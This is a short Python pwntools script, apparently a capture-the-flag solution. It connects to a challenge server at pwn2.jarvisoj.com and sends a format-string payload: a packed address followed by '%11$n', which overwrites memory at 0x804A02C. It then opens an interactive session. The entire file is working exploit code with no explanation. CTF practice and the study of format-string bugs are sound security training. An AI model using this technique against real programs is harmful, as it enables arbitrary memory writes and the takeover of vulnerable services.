#! /usr/bin/python

from pwn import * 

p = remote('pwn2.jarvisoj.com',9895)

x = 0x804A02C
payload = p32(x) + '%11$n'
p.sendline(payload)

p.interactive()
